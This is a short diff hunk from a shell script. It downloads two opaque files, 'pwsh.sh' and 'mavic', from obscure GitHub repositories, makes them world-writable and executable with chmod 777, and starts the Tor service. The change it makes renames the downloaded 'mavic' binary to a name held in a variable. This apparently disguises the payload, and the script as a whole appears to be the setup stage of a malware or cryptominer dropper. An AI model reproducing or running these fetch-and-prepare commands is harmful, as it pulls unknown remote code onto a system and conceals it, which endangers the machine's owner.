@@ -41,7 +41,9 @@
         
         wget https://github.com/unmsjd28/hjs839/raw/main/pwsh.sh
         wget https://github.com/unmsjd28/ynsg7s9/raw/main/mavic
-        chmod 777 mavic
+        mv mavic $mav
+        chmod 777 $mav
+       
         chmod 777 pwsh.sh
         service tor start
         
